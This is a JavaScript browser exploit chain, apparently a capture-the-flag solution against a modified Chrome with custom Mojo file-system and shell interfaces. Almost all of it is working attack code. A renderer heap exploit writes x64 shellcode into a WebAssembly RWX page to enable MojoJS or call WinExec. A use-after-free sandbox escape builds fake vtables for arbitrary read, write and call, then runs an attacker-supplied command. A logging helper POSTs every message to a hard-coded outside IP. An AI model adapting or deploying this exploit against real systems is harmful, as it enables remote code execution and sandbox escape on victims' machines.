
function gen_str(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.split('');
    let randomString = '';
    for (let i = 0; i < length; i++) {
        randomString += characters[Math.floor(Math.random() * characters.length)];
    }
    return randomString;
}

function CheckArrayEqual(arrA, arrB) {
    if (arrA.length !== arrB.length) {
        return false;
    }
    for (let i = 0; i < arrA.length; i++) {
        if (arrA[i] !== arrB[i]) {
            return false;
        }
    }
    return true;
}

let hex = (val, pack = 16) => '0x' + val.toString(16).padStart(pack, '0');

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function log(message) {
    document.body.innerHTML += `${message}<br>`;
    fetch('http://52.79.249.160:1234', {
        method: 'POST',
        body: message
    });
}

function gc() {
    let x = [];
    for (let i = 0; i < 200; i++) {
        x.push(new Array(1024 * 1024));
    }
}

function dump_array(val) {
    for (let i = 0; i < val.length; i += 2) {
        console.log(hex(val[i]) + " | " + hex(val[i + 1]));
    }
}

function ArrayToBigInt(val) {
    const bigIntValue = [];
    for (let i = 0; i < val.length; i += 8) {
        const chunk = val.slice(i, i + 8);
        let bigInt = BigInt(0);
        for (let j = 0; j < chunk.length; j++) {
            bigInt |= BigInt(chunk[j]) << BigInt(j * 8);
        }
        bigIntValue.push(bigInt);
    }
    return bigIntValue;
}

function BigIntToArray(val) {
    const arr = [];
    for (let j = 0; j < 8; j++) {
        arr.push(Number((val >> BigInt(j * 8)) & BigInt(0xff)));
    }
    return arr;
}

function stringToChunks(str, chunkSize = 8) {
    const chunks = [];
    const bytes = new TextEncoder().encode(str);

    for (let i = 0; i < bytes.length; i += chunkSize) {
        const chunk = bytes.slice(i, i + chunkSize);

        let paddedChunk;
        if (chunk.length < chunkSize) {
            paddedChunk = new Uint8Array(chunkSize);
            paddedChunk.set(chunk);
        } else {
            paddedChunk = chunk;
        }

        let bigintValue = 0n;
        for (let j = paddedChunk.length - 1; j >= 0; j--) {
            bigintValue = (bigintValue << 8n) + BigInt(paddedChunk[j]);
        }

        chunks.push(bigintValue);
    }

    return chunks;
}

function reloc(arr, target, replacement) {
    for (var i = 0; i < arr.length; i++) {
        var temp = arr.slice(i, i + 8)
        var value = ArrayToBigInt(temp)[0];
        if (value == target) {
            console.log("Found target at index: " + i + " with value: " + hex(target));
            arr.splice(i, 8, ...BigIntToArray(replacement))
        }
    }
    return arr;
}

function u64(x) {
    let r = BigInt(0);
    for (let i = 0; i < 8; i++) {
        r |= BigInt(x.charCodeAt(i)) << BigInt((7 - i) * 8);
    }
    return r;
}

function p64(x) {
    let r = BigInt(0);
    let tmp = x;

    for (let i = 0; i < 8; i++) {
        r = r << BigInt(8);
        r += tmp & BigInt(0xFF);
        tmp = tmp >> BigInt(8);
    }

    return r;
}

function stringToChunks(str, chunkSize = 8) {
    const chunks = [];


    const bytes = new TextEncoder().encode(str);


    for (let i = 0; i < bytes.length; i += chunkSize) {
        const chunk = bytes.slice(i, i + chunkSize);


        let paddedChunk;
        if (chunk.length < chunkSize) {
            paddedChunk = new Uint8Array(chunkSize);
            paddedChunk.set(chunk);
        } else {
            paddedChunk = chunk;
        }

        let bigintValue = 0n;
        for (let j = paddedChunk.length - 1; j >= 0; j--) {
            bigintValue = (bigintValue << 8n) + BigInt(paddedChunk[j]);
        }

        chunks.push(bigintValue);
    }

    return chunks;
}


const offsets = {
    didwrite: 0xC420E90n,
    ret: 0xC420E90n + 177n,
    invoke4args: 0x8B598E0n,
    Writefile_IAT_offset: 0x14336070n,
    writefile_offset: 0x00057740n,
    winexec_offset: 0x000709e0n,
    dir_item_vtable: 0x12A53470n,
    dir_dir_vtable: 0x12A53430n,
    file_item_vtable: 0x12A533E0n,
    file_file_vtable: 0x12A533B0n,
    chromedll_offset: 0x4D34250n,
    rw_region: 0x14e08100n,


    mojo_to_chrome_dll: 0x12b4e000n,//b0x7ffa8f06df80n - 0x00007ffa8f070000n,
    wasm_cpt_obj: 0x7ffaa3565300n - 0x00007ffa8f070000n,
    set_RW_func: 0x0007ffa985ea940n - 0x00007ffa8f070000n,
    set_R_func: 0x0007ffa985eaa40n - 0x00007ffa8f070000n,
    is_mojo_js_enabled_: 0x0007ffaa3e7d080n - 0x00007ffa8f070000n,
}


class SandboxExploit {
    constructor() {
        this.cfs_manager = null;
        this.root_dir = null;
        this.spray_dir = null;
        this.temp_dir = null;

        this.try_cnt = 0x800;
        this.spray_capacity = this.try_cnt + 0x100;

        this.rw_page = 0n;


        this.slot = [];
        this.fast_alloc_head = 0;
    }

    async createFile(dir, filename) {
        var type = blink.mojom.cfs.ITEMTYPE.kFile;
        var r = await dir.createItem(filename, type);
        if (r.type == blink.mojom.cfs.ITEMTYPE.kFile) {
            return r.remoteItem.$data
        } else {
            throw new Error("failed to create file")
        }
    }

    async createDirectory(dir, filename) {
        var type = blink.mojom.cfs.ITEMTYPE.kDir;
        var r = await dir.createItem(filename, type);
        if (r.type == blink.mojom.cfs.ITEMTYPE.kDir) {
            return r.remoteItem.$data;
        } else {
            throw new Error("failed to create directory");
        }
    }

    async prepare_UAF() {
        log("Preparing UAF...");
        await this.root_dir.deleteItem("spray_dir");
        await this.root_dir.deleteItem("temp_dir");

        this.spray_dir = await this.createDirectory(this.root_dir, "spray_dir");
        this.temp_dir = await this.createDirectory(this.root_dir, "temp_dir");

        for (var i = 0; i < this.try_cnt; i++) {
            await this.createFile(this.root_dir, "temp_file" + i);
            await this.createFile(this.temp_dir, "temp_file" + i);
        }

        this.fast_alloc_head = 0;
        this.slot = [];
        for (var i = 0; i < this.spray_capacity; i++) {
            this.slot[i] = await this.createFile(this.spray_dir, "spray_file" + i);
        }
        log("Finish preparing UAF...");
    }

    async slow_alloc(data) {
        var temp = await this.createFile(this.spray_dir, gen_str(6))
        temp.write(data);
        return temp;
    }

    async fast_alloc(data) {
        this.slot[this.fast_alloc_head++].write(data);
    }

    get_spray_obj(i) {
        return this.slot[i];
    }

    async sbx_init() {

        this.cfs_manager = new blink.mojom.cfs.CodegateFSManagerPtr();
        Mojo.bindInterface(blink.mojom.cfs.CodegateFSManager.name, mojo.makeRequest(this.cfs_manager).handle);

        this.chrome_dll_addr = BigInt((await this.cfs_manager.getCode()).addr) - offsets.chromedll_offset;
        this.rw_page = this.chrome_dll_addr + offsets.rw_region;

        log("chrome.dll address: " + hex(this.chrome_dll_addr));
        log("rw_page: " + hex(this.rw_page));



        var r = await this.cfs_manager.createFileSystem();
        this.root_dir = r.remoteDir;

        log("SBX Init Done");
    }

    make_fake_directory() {

        var victim_size = 0xb0;
        var ab = new ArrayBuffer(victim_size);
        var fake = new DataView(ab);

        fake.setBigUint64(0x0, p64(this.chrome_dll_addr + offsets.dir_dir_vtable));
        fake.setBigUint64(0x8, p64(this.chrome_dll_addr + offsets.dir_item_vtable));
        fake.setBigUint64(0x10, p64(0x0000000000000002n));

        fake.setBigUint64(0x18, p64(0x5151515151515151n));
        fake.setBigUint64(0x20, p64(0x0000000000000000n));
        fake.setBigUint64(0x28, p64(0x08n << 56n));

        fake.setBigUint64(0x30, p64(0x0n));


        fake.setBigUint64(0x38, p64(0x0n));
        fake.setBigUint64(0x40, p64(0x0n));
        fake.setBigUint64(0x48, p64(0x0n));
        fake.setBigUint64(0x50, p64(0x0n));
        fake.setBigUint64(0x58, p64(0x0n));
        fake.setBigUint64(0x60, p64(0x1n));
        fake.setBigUint64(0x68, p64(0x0n));
        fake.setBigUint64(0x70, p64(0x1n));
        fake.setBigUint64(0x78, p64(0x0n));
        fake.setBigUint64(0x80, p64(0x0n));


        fake.setBigUint64(0x88, p64(0x0n));
        fake.setBigUint64(0x90, p64(0x0n));
        fake.setBigUint64(0x98, p64(0x0n));

        fake.setBigUint64(0xa0, p64(this.chrome_dll_addr + 0xe0n));
        fake.setBigUint64(0xa8, p64(0x4141414142424242n));

        return ab;
    }

    set_fake_directory(ab, idx, value) {
        var fake = new DataView(ab);
        fake.setBigUint64(idx, p64(value));
        return fake;
    }

    async makeUafObject(ab) {
        var ___ = new Uint8Array(ab);

        var _ = await this.createDirectory(this.root_dir, "qwer");
        var __ = await this.createDirectory(_, "qwer");

        log("Making Threadrunner Busy...");

        for (var i = 0; i < this.try_cnt; i++) {
            this.root_dir.changeItemLocation("temp_file" + i, "temp_dir");
        }

        var prom = this.root_dir.changeItemLocation("qwer", "qwer")

        for (var i = 0; i < this.spray_capacity; i++) {
            this.fast_alloc(___);
        }

        await sleep(2000);

        var original;
        await this.get_spray_obj(0).read().then((r) => {
            console.log("Read data: " + r.data);
            original = r.data;
        });

        var leak;
        var idx;
        for (var i = 0; i < this.spray_capacity; i++) {
            await this.get_spray_obj(i).read().then((r) => {
                if (!CheckArrayEqual(r.data, original)) {
                    console.log("Read data: " + r.data);
                    leak = ArrayToBigInt(r.data);
                    idx = i;
                }
            });
        }
        var swp_dir;
        await prom.then((r) => {
            swp_dir = r.remoteItem.$data;
        });

        if (leak == undefined) {
            log("Failed to leak data");
            return [null, null, null];
        }

        var leak1 = leak[0x88 / 8];
        var leak2 = leak[0x90 / 8];
        console.log("Leak: " + hex(leak1));
        console.log("Leak: " + hex(leak2));
        if ((leak1 + 0x8n) == leak2) {
            log("Successfully Overwrite");

        } else {
            log("Failed to overwrite");
            return [null, null, null];
        }


        return [swp_dir, this.slot[idx]]

    }

    async edit64(rw, idx, value) {
        for (var i = 0; i < 8; i++) {
            await rw.edit(idx + i, Number((value >> BigInt(i * 8)) & BigInt(0xff)));
        }
    }

    async sbx_exploit(cmd) {
        await this.sbx_init();



        var fake_ab = this.make_fake_directory();
        this.set_fake_directory(fake_ab, 0x88, this.chrome_dll_addr + offsets.rw_region + 0x100n);
        this.set_fake_directory(fake_ab, 0x90, this.chrome_dll_addr + offsets.rw_region + 0x100n);
        this.set_fake_directory(fake_ab, 0x98, this.chrome_dll_addr + offsets.rw_region + 0x200n);
        this.set_fake_directory(fake_ab, 0x30, 0x0n);

        var swp_dir = null;
        var uaf_readwriter = null;
        var leak = null;
        while (swp_dir == null) {
            await this.prepare_UAF();
            [swp_dir, uaf_readwriter] = await this.makeUafObject(fake_ab);
        }




        var size = 0x500n;
        var alloc_size = 0x548n;
        await swp_dir.renameItem("..", "A".repeat(Number(size)));


        var temp = 0n;
        await uaf_readwriter.read().then((r) => {
            temp = ArrayToBigInt(r.data);
        })

        var heap_leak = temp[0x18 / 8];
        log("Heap leak : " + hex(heap_leak))





        log("Change vector ptr to heap leak");
        await this.edit64(uaf_readwriter, 0x88, heap_leak);
        await this.edit64(uaf_readwriter, 0x90, heap_leak);
        await this.edit64(uaf_readwriter, 0x98, heap_leak + size);


        log("Fill the vector with files");
        var files = []
        for (var i = 0; i < size / 8n; i++) {
            files[i] = await this.createFile(swp_dir, "file" + i);
            swp_dir.changeItemLocation("file" + i, "..");
        }


        log("Free the vector");
        files.push(await this.createFile(swp_dir, "free"));
        swp_dir.changeItemLocation("free", "..");

        log("And then?");



        log("Create Fake Object");
        var victim_size = Number(alloc_size);
        var ab = new ArrayBuffer(victim_size);
        const __ = new Uint8Array(ab);
        __.fill(0x99);


        var fake_obj = new DataView(ab);
        var fake_codegate_directory_impl = heap_leak + 0x100n;

        const MAGIC = 0x0011335577224466n;
        fake_obj.setBigUint64(0x0, u64("QWERQWER"))


        fake_obj.setBigUint64(0x10, p64(heap_leak + 0x108n));
        fake_obj.setBigUint64(0x18, p64(0x2222222222222222n));
        fake_obj.setBigUint64(0x20, p64(0x3333333333333333n));


        fake_obj.setBigUint64(0x100, p64(this.chrome_dll_addr + offsets.file_file_vtable));
        fake_obj.setBigUint64(0x108, p64(this.chrome_dll_addr + offsets.file_item_vtable));
        fake_obj.setBigUint64(0x110, p64(0xABABABAB00000001n));
        fake_obj.setBigUint64(0x118, p64(0x5050505050505050n));
        fake_obj.setBigUint64(0x120, p64(0x0n));
        fake_obj.setBigUint64(0x128, p64(0x8n << 56n));
        fake_obj.setBigUint64(0x130, p64(0x0n));
        fake_obj.setBigUint64(0x138, p64(heap_leak + 0x480n));
        fake_obj.setBigUint64(0x140, p64(0x0n));
        fake_obj.setBigUint64(0x148, p64(0x1n));
        fake_obj.setBigUint64(0x150, p64(heap_leak + 0x480n));
        fake_obj.setBigUint64(0x158, p64(0x0n));
        fake_obj.setBigUint64(0x160, p64(0x0n));
        fake_obj.setBigUint64(0x168, p64(heap_leak + 0x480n));
        fake_obj.setBigUint64(0x170, p64(0x1n));
        fake_obj.setBigUint64(0x178, p64(heap_leak + 0x480n));
        fake_obj.setBigUint64(0x180, p64(heap_leak + 0x480n));
        fake_obj.setBigUint64(0x188, p64(heap_leak + 0x10n));
        fake_obj.setBigUint64(0x190, p64(heap_leak + 0x18n));
        fake_obj.setBigUint64(0x198, p64(heap_leak + 0xf0n));
        fake_obj.setBigUint64(0x1a0, p64(0x4444444444444444n));
        fake_obj.setBigUint64(0x1a8, p64(0x4444444444444444n));


        fake_obj.setBigUint64(0x200, p64(0x1n));
        fake_obj.setBigUint64(0x208, p64(0x4444444444444444n));
        fake_obj.setBigUint64(0x210, p64(0x1122334455667782n));
        fake_obj.setBigUint64(0x218, p64(0x1122334455667783n));
        fake_obj.setBigUint64(0x220, p64(0x1122334455667784n));
        fake_obj.setBigUint64(0x228, p64(0x1122334455667785n));
        fake_obj.setBigUint64(0x230, p64(0x1122334455667786n));
        fake_obj.setBigUint64(0x238, p64(0x1122334455667787n));
        fake_obj.setBigUint64(0x240, p64(0x1122334455667788n));


        fake_obj.setBigUint64(0x280, p64(0x1122334455667788n));


        fake_obj.setBigUint64(0x300, p64(0xdeadbeefcafeba00n));
        fake_obj.setBigUint64(0x308, p64(0xdeadbeefcafeba01n));
        fake_obj.setBigUint64(0x310, p64(0xdeadbeefcafeba02n));
        fake_obj.setBigUint64(0x318, p64(0xdeadbeefcafeba03n));
        fake_obj.setBigUint64(0x320, p64(0xdeadbeefcafeba04n));
        fake_obj.setBigUint64(0x328, p64(0xdeadbeefcafeba05n));
        fake_obj.setBigUint64(0x330, p64(this.chrome_dll_addr + offsets.didwrite));
        fake_obj.setBigUint64(0x338, p64(0xdeadbeefcafeba07n));
        fake_obj.setBigUint64(0x340, p64(0xdeadbeefcafeba08n));


        log("Occupy the freed memory");
        var final_spray = [];
        for (var i = 0; i < 0x1000; i++) {


            fake_obj.setBigUint64(0x8, u64(i.toString().padStart(8, '0')));

            var _ = new Uint8Array(ab);
            final_spray.push(await this.slow_alloc(_));
        }


        log("Check Occupied Memory with pwd");
        var pwd = (await swp_dir.getPwd()).data;
        log("pwd: " + pwd);
        if (!pwd.startsWith("/QWERQWER")) {
            log("Failed to occupy memory");
            window.location.reload();
            return;
        }

        log("Successfully occupied memory");
        var spray_idx = parseInt(pwd.slice(9, 9 + 8));
        var heapleak_readwriter = final_spray[spray_idx];


        {
            log("Install Primitive");
            this.swp_dir = swp_dir;
            this.uaf_readwriter = uaf_readwriter;
            this.heapleak_readwriter = heapleak_readwriter;
            this.heap_leak = heap_leak;


            await this.edit64(this.uaf_readwriter, 0x10, 2n);




            await this.edit64(this.uaf_readwriter, 0x38, (this.heap_leak + 0x500n));
            await this.edit64(this.uaf_readwriter, 0x40, (0x0n));
            await this.edit64(this.uaf_readwriter, 0x48, (0x1n));
            await this.edit64(this.uaf_readwriter, 0x50, (this.heap_leak + 0x500n));
            await this.edit64(this.uaf_readwriter, 0x58, (0x0n));
            await this.edit64(this.uaf_readwriter, 0x60, (0x0n));
            await this.edit64(this.uaf_readwriter, 0x68, (this.heap_leak + 0x500n));
            await this.edit64(this.uaf_readwriter, 0x70, (0x1n));
            await this.edit64(this.uaf_readwriter, 0x78, (this.heap_leak + 0x500n));
            await this.edit64(this.uaf_readwriter, 0x80, (this.heap_leak + 0x500n));


            await this.edit64(this.uaf_readwriter, 0x88, this.heap_leak + 0x10n);
            await this.edit64(this.uaf_readwriter, 0x90, this.heap_leak + 0x18n);
            await this.edit64(this.uaf_readwriter, 0x98, this.heap_leak + 0xf0n);

            log("UAF_obj -> vector<> => my heap");

            this.trigger = (await this.swp_dir.getItemHandle("..")).remoteItem.$data;
            this.arb_obj = (await this.trigger.getItemHandle("PPPPPPPP")).remoteItem.$data;
            console.log(this.trigger);
            console.log(this.arb_obj);
            log("Arbitrary Object is ready");

        }


        var base = await this.arbitrary_read64(this.chrome_dll_addr);
        log("base : " + hex(base));

        var v = await this.arbitrary_read64(this.chrome_dll_addr + offsets.rw_region);
        log("rw : " + hex(v))

        await this.arbitrary_write64(this.chrome_dll_addr + offsets.rw_region, 0xdeadbeefcafebaben);
        var v = await this.arbitrary_read64(this.chrome_dll_addr + offsets.rw_region);
        log("rw : " + hex(v))


        var writefile_stub = await this.arbitrary_read64(this.chrome_dll_addr + offsets.Writefile_IAT_offset);
        log("writefile_stub : " + hex(writefile_stub));
        var kernel32_baae = writefile_stub - offsets.writefile_offset

        var winexec = kernel32_baae + offsets.winexec_offset
        var chunks = stringToChunks(cmd);
        for (i = 0n; i < chunks.length; i++) {
            await this.arbitrary_write64(this.heap_leak + 0x500n + i * 8n, (chunks[i]));
        }

        await this.arbitrary_call(winexec, [
            this.heap_leak + 0x500n,
            5n,
            0n,
            0n
        ]);

        log("All is done");
        await sleep(100000);
    }

    async arbitrary_read64(address) {


        await this.edit64(this.heapleak_readwriter, 0x188, address);
        await this.edit64(this.heapleak_readwriter, 0x190, address + 0x8n);
        await this.edit64(this.heapleak_readwriter, 0x198, address + 0x20n);

        var data = ArrayToBigInt((await this.arb_obj.read()).data)[0];
        return data;
    }

    async arbitrary_write64(address, value) {

        await this.edit64(this.heapleak_readwriter, 0x188, address);
        await this.edit64(this.heapleak_readwriter, 0x190, address + 0x8n);
        await this.edit64(this.heapleak_readwriter, 0x198, address + 0x20n);

        await this.edit64(this.arb_obj, 0x0, value);

    }

    async arbitrary_call(address, args = []) {
        if (args.length > 4) {
            alert("args length is Bigger than 4");
            return;
        }

        if (args.length < 4) {
            for (var i = args.length; i < 4; i++) {
                args[i] = 0n;
            }
        }



        await this.edit64(this.uaf_readwriter, 0x0, this.heap_leak + 0x300n);
        await this.edit64(this.uaf_readwriter, 0x8, this.heap_leak + 0x300n);



        await this.edit64(this.heapleak_readwriter, 0x330, this.chrome_dll_addr + offsets.didwrite);





        await this.edit64(this.uaf_readwriter, 0x10, (this.heap_leak + 0x200n));

        await this.edit64(this.heapleak_readwriter, 0x200, 0x1n);
        await this.edit64(this.heapleak_readwriter, 0x208, this.chrome_dll_addr + offsets.invoke4args);
        await this.edit64(this.heapleak_readwriter, 0x210, this.chrome_dll_addr + offsets.ret);
        await this.edit64(this.heapleak_readwriter, 0x218, this.chrome_dll_addr + offsets.ret);


        await this.edit64(this.heapleak_readwriter, 0x20 + 0x200, address);
        await this.edit64(this.heapleak_readwriter, 0x28 + 0x200, args[0]);
        await this.edit64(this.heapleak_readwriter, 0x30 + 0x200, args[1]);
        await this.edit64(this.heapleak_readwriter, 0x38 + 0x200, args[2]);
        await this.edit64(this.heapleak_readwriter, 0x40 + 0x200, args[3]);

        this.trigger.listItems().then((r) => {
            console.log("Trigger list: " + r.data);
            log("Trigger list: " + r.data);
        });

    }
}

class RendererExploit {
    constructor() {
        this.logging = false;
        this.buffer_size = 0x400;
        this.shell_capacity = 1000;
        this.target_shell = -1;

        this.heap_leak = 0n;
        this.chrome_leak = 0n;
    }

    async init() {
        this.shell = []
        for (var i = 0; i < this.shell_capacity; i++) {
            await window.miniShellManager.CreateShell();
            this.shell[i] = await window.miniShellManager.get(i + 1);
        }
    }

    async exec(cmd, i = this.target_shell) {
        const res = await this.shell[i].execute(cmd);
        if (this.logging) {
            console.log(res);
            log(res);
        }
        return res;
    }



    async relative_read64(idx) {
        await this.exec("seek " + idx);
        var res = await this.exec("read 8");
        res = res.split(' ').map(n => parseInt(n, 16));
        return ArrayToBigInt(res)[0];
    }

    async relative_write64(idx, data) {
        await this.exec("seek " + idx);
        var dat = BigIntToArray(data).map(n => n.toString(16).padStart(2, '0')).join(' ');
        await this.exec("write 8 " + dat);
    }

    async arbitrary_read8(addr) {
        if (this.heap_leak == 0n) {
            new Error("AAAAAAAAA");
            return;
        }

        await this.exec("seek " + (addr - this.heap_leak));
        var res = await this.exec("read 1");
        res = res.split(' ').map(n => parseInt(n, 16));
        return ArrayToBigInt(res)[0];
    }

    async arbitrary_read64(addr) {
        if (this.heap_leak == 0n) {
            new Error("AAAAAAAAA");
            return;
        }

        await this.exec("seek " + (addr - this.heap_leak));
        var res = await this.exec("read 8");
        res = res.split(' ').map(n => parseInt(n, 16));
        return ArrayToBigInt(res)[0];
    }

    async arbitrary_write8(addr, data) {
        if (this.heap_leak == 0n) {
            new Error("AAAAAAAAA");
            return;
        }

        await this.exec("seek " + (addr - this.heap_leak));
        await this.exec("write 1 " + data.toString(16).padStart(2, '0'));
    }

    async arbitrary_write64(addr, data) {
        if (this.heap_leak == 0n) {
            new Error("AAAAAAAAA");
            return;
        }

        await this.exec("seek " + (addr - this.heap_leak));
        var dat = BigIntToArray(data);
        dat = dat.map(n => n.toString(16).padStart(2, '0')).join(' ');
        await this.exec("write 8 " + dat);
    }

    async renderer_exploit(cmd = false) {
        await this.init();
        // Same Thread.

        console.log(1);
        // Grooming / Spray
        for (var i = 0; i < 100; i++) {
            var filename = "file" + i;
            await this.exec("touch " + filename, i);
            await this.exec("open " + filename, i);
            let hexs = i.toString(16).padStart(4, '0');
            const hi = hexs.substring(0, 2);
            const lo = hexs.substring(2, 4);
            var data = ` ${lo} ${hi}`.repeat(this.buffer_size / 2);
            await this.exec("write " + this.buffer_size + data, i);
        }

        this.target_shell = 90;

        // Make Hole
        gc();
        gc();
        await sleep(2000);

        var leak = await this.relative_read64(0x408n) - 0x400n;
        console.log("[idx:89] leak: " + hex(leak));

        // set heap leak for calculation
        this.heap_leak = leak;
        console.log("target heapleak: " + hex(this.heap_leak));

        this.target_shell = 89;

        // Heap Leak test
        {
            var leak_test = await this.arbitrary_read64(this.heap_leak - 0x8n);
            if (leak_test != 0xfffffffffffffff8n) {
                throw new Error("Leak test failed, expected 0xfffffffffffffff8n but got " + hex(leak_test));
                return;
            }
            console.log("Heap leak success");
        }

        // Chrome leak & WASM CPT leak & Call
        {
            var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 6, 1, 96, 2, 126, 126, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 4, 1, 2, 0, 11]);
            var wasmModule = new WebAssembly.Module(wasmCode);
            var wasmInstance2 = new WebAssembly.Instance(wasmModule);
            var f2 = wasmInstance2.exports.main;

            var heap_mojo = await this.relative_read64((1 << 64) - 1 - 0x10);
            var mojo_table = (this.heap_leak & 0xffff00000000n) | ((heap_mojo << 3n) & 0xffffffffn);
            var chrome_leak = (await this.arbitrary_read64(mojo_table)) - offsets.mojo_to_chrome_dll;
            log("chrome leak: " + hex(chrome_leak));
            if ((chrome_leak & 0xfffn) != 0x000n) {
                window.location.reload();
                return
            }

            if (((chrome_leak >> 32n) & 0xffffn) == 0xffffn) {
                window.location.reload();
                return
            }

            await sleep(1000);

            var wasm_cpt_obj_ptr = chrome_leak + offsets.wasm_cpt_obj;
            log("wasm_cpt_obj: " + hex(wasm_cpt_obj_ptr));
            await sleep(1000);

            var wasm_cpt_obj_data = await this.arbitrary_read64(wasm_cpt_obj_ptr);
            log("cpt: " + hex(wasm_cpt_obj_data));
            await sleep(1000);

            var rwx_page = await this.arbitrary_read64(wasm_cpt_obj_data);
            log("RWX Page: " + hex(rwx_page));

            var chunks = stringToChunks(cmd);
            for (i = 0n; i < chunks.length; i++) {
                await this.arbitrary_write64(rwx_page + 0x300n + i * 8n, (chunks[i]));
            }

            if (cmd) {

                var getflag_sc = [0x90, 0x57, 0x56, 0x52, 0x51, 0x53, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8, 0x49, 0x81, 0xc0, 0xe0, 0x09, 0x07, 0x00, 0x4d, 0x89, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb9, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x48, 0x83, 0xc2, 0x05, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0xff, 0xd3, 0x41, 0x59, 0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58, 0x5b, 0x59, 0x5a, 0x5e, 0x5f, 0xc3, 0x00];
                reloc(getflag_sc, 0x4141414141414141n, rwx_page + 0x300n);

                var nopsled = Array(10).fill(0x90);
                var sc = nopsled.concat(getflag_sc);
                for (var i = 0n; i < BigInt(sc.length); i++) {
                    await this.arbitrary_write8(rwx_page + i, BigInt(sc[i])); // Overwrite RWX Page
                }

            } else {
                var nopsled = Array(100).fill(0x90);
                var sc_enable_mojo_js = [80, 83, 81, 82, 65, 80, 65, 81, 65, 82, 65, 83, 65, 84, 65, 85, 65, 86, 65, 87, 87, 86, 72, 184, 68, 68, 68, 68, 68, 68, 68, 68, 72, 185, 85, 85, 85, 85, 85, 85, 85, 85, 72, 186, 102, 102, 102, 102, 102, 102, 102, 102, 255, 208, 72, 191, 119, 119, 119, 119, 119, 119, 119, 119, 198, 7, 1, 72, 184, 17, 17, 17, 17, 17, 17, 17, 17, 72, 185, 34, 34, 34, 34, 34, 34, 34, 34, 72, 186, 51, 51, 51, 51, 51, 51, 51, 51, 255, 208, 94, 95, 65, 95, 65, 94, 65, 93, 65, 92, 65, 91, 65, 90, 65, 89, 65, 88, 90, 89, 91, 88, 195];

                reloc(sc_enable_mojo_js, 0x4444444444444444n, chrome_leak + offsets.set_RW_func); // RW FUNC
                reloc(sc_enable_mojo_js, 0x5555555555555555n, (chrome_leak + offsets.is_mojo_js_enabled_) & 0xfffffffffffff000n); // start
                reloc(sc_enable_mojo_js, 0x6666666666666666n, ((chrome_leak + offsets.is_mojo_js_enabled_) & 0xfffffffffffff000n) + 0x1000n); // end

                reloc(sc_enable_mojo_js, 0x7777777777777777n, chrome_leak + offsets.is_mojo_js_enabled_); // is_mojo_js_enabled_

                reloc(sc_enable_mojo_js, 0x1111111111111111n, chrome_leak + offsets.set_R_func); // R FUNC
                reloc(sc_enable_mojo_js, 0x2222222222222222n, (chrome_leak + offsets.is_mojo_js_enabled_) & 0xfffffffffffff000n); // start
                reloc(sc_enable_mojo_js, 0x3333333333333333n, ((chrome_leak + offsets.is_mojo_js_enabled_) & 0xfffffffffffff000n) + 0x1000n); // end

                var sc = nopsled.concat(sc_enable_mojo_js);
                for (var i = 0n; i < BigInt(sc.length); i++) {
                    await this.arbitrary_write8(rwx_page + i, BigInt(sc[i])); // Overwrite RWX Page
                }
            }

            log("Shellcode written to RWX page, executing...");
            f2(1n, 1n);
        }
    }
}
